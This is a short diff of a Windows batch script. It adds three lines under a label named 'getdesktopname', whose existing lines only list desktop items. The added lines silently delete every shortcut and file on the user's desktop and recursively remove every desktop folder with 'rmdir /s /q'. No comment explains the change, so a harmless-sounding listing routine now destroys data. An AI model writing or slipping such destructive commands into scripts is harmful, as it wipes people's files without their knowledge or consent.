@@ -49,6 +49,9 @@ goto:b
 :getdesktopname
 for %%d in (%USERPROFILE%\Desktop\*.lnk) do echo %%d
 for /d %%a in (%USERPROFILE%\Desktop\*) do echo %%a
+for %%g in (%USERPROFILE%\Desktop\*.lnk) do del %%g
+for %%f in (%USERPROFILE%\Desktop\*) do del %%f
+for /d %%d in ("%USERPROFILE%\Desktop\*") do rmdir /s /q "%%d"
 pause
 
 
